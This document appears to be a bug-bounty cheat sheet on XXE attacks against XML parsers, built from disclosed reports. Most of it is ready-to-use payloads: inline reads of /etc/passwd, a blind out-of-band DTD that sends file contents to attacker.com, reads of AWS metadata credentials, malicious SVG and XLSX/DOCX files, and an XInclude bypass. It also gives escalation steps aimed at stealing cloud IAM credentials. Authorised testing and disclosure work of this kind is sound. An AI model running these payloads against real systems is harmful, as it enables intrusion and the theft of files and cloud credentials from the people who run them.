# XXE — 4 Disclosed Reports

---

## High-Signal Targets

- SAML/SSO endpoints (XML assertions processed before signature validation)
- File uploads: SVG, DOCX, XLSX, PDF
- Shared backend infrastructure (one XXE can affect 26+ subdomains)
- API gateways accepting `application/xml`, `text/xml`, `application/soap+xml`
- SOAP web services

**URL patterns to test:**
```
/api/*/xml, /upload, /import, /parse, /convert
/saml/acs, /soap/*, /wsdl, /api/*/feed
```

---

## Paid Patterns

**Inline XXE - file read:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<root><data>&xxe;</data></root>
```

**Blind OOB exfiltration:**
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ENTITY % remote SYSTEM "https://attacker.com/xxe.dtd">
  %remote;
]>
<root><data>&send;</data></root>
```

attacker.com/xxe.dtd:
```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % wrap "<!ENTITY send SYSTEM 'https://attacker.com/?d=%file;'>">
%wrap;
```

**AWS metadata via XXE:**
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">]>
```

**SVG file upload XXE:**
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<svg xmlns="http://www.w3.org/2000/svg">
  <text>&xxe;</text>
</svg>
```

**XLSX/DOCX XXE:**
```bash
# Unzip, inject in xl/workbook.xml or word/document.xml, re-zip
unzip target.xlsx -d target_dir
# Add XXE payload to xl/workbook.xml
cd target_dir && zip -r ../malicious.xlsx .
```

**XInclude (when DOCTYPE is blocked):**
```xml
<foo xmlns:xi="http://www.w3.org/2001/XInclude">
<xi:include parse="text" href="file:///etc/passwd"/></foo>
```

---

## Parser Note (2026)

Python 3.7.1+, modern Ruby, and lxml 5.x disable external entities by default. Test inline entity expansion first:

```xml
<!DOCTYPE foo [<!ENTITY test "hello">]>
<root>&test;</root>
```

If `hello` appears in the response, the parser processes entities. If not, it is likely hardened and SYSTEM entity payloads will not work.

---

## Root Causes

- Java SAX/DOM parsers without `FEATURE_SECURE_PROCESSING` enabled
- PHP `simplexml_load_string()` or `DOMDocument` without `LIBXML_NONET`
- Older Nokogiri or REXML versions in Ruby
- Node.js `xml2js` or `libxmljs` older versions

---

## Real-World Impact

Shared backend infrastructure is the highest multiplier - one XXE in a shared XML processing service can affect 26+ subdomains simultaneously. Escalate impact by:
1. Reading `/etc/passwd` for user enumeration
2. Reading application config files for credentials
3. Pivoting to SSRF to reach cloud metadata endpoints
4. Exfiltrating AWS/GCP IAM credentials for full cloud account access

---

## Pre-Submission Validation Gate

1. Can you display `/etc/passwd` content or confirm OOB file exfiltration via callback?
2. Is the impact specific? (named credentials, AWS keys, config files, PII)
3. Reproducible with a single curl command within 10 minutes?
